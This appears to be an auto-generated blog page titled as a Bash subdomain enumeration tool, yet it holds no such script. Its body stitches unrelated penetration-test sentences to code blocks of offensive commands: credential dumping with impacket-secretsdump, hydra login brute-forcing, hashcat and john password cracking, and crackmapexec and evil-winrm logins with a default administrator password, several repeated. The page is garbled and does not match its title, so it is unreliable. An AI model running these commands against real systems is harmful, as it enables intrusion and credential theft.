---
TitleSEO: "Subdomain Enumeration Tool in Bash | ZureFX"
TitlePost: "Subdomain Enumeration Tool — Bash"
Author: "ZureFX"
Description: "A Bash script for subdomain enumeration tool. Built for security research and automation."
Keywords: "automation, python, scanner, bash, tool, go"
URL: "https://zurefx.github.io/scripting/script-subdomain-enumeration-tool-446.html"
URL_IMAGES: ""
Date: "2024-10-14"
Tags: "Automation, Python, Scanner, Bash, Tool, Go"
Section: "scripting"
Lang: "en"
main_img: "script-subdomain-enumeration-tool-446"
Permalink: "/scripting/script-subdomain-enumeration-tool-446.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `secretsdump`
- `netcat`
- `burpsuite`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.94.157.239 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.44.66.18 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p139,995,135 10.101.100.187 -oN scan.txt
evil-winrm -i 10.105.18.249 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.41.22.145
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

```bash
gobuster dir -u http://10.68.135.114/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.127.193
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.71.192.13 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p5986,995,3306 10.21.80.56 -oN scan.txt
feroxbuster -h
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 5.31s
```
